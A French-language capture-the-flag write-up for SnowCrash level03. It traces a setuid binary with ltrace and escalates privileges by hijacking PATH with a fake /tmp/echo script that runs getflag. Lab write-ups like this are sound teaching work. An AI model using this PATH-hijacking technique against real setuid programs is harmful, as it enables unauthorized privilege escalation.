## Level 03:

On arrive directement sur un folder avec un executable `level03`

avec [`ltrace`](https://man7.org/linux/man-pages/man1/ltrace.1.html) on peut voir cette ligne : 

```bash
level03@SnowCrash:~$ ltrace level03
Can't execute `level03': No such file or directory
PTRACE_SETOPTIONS: No such process
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                   = 2003
geteuid()                                                   = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)         = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                      = 0
+++ exited (status 0) +++
```

Cela nous indique un appel systeme d'echo.
On va donc faire un echo exploit en creant un fichier `echo` dans lequel on va mettre le path de getflag.  
Avec `export` on va rajouter le chemin d'`echo` a PATH (au debut) et relancer le binaire. 

```bash
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo && chmod 755 /tmp/echo && export PATH=/tmp/:$PATH && ./level03
```
Puis ```./level03 ```     

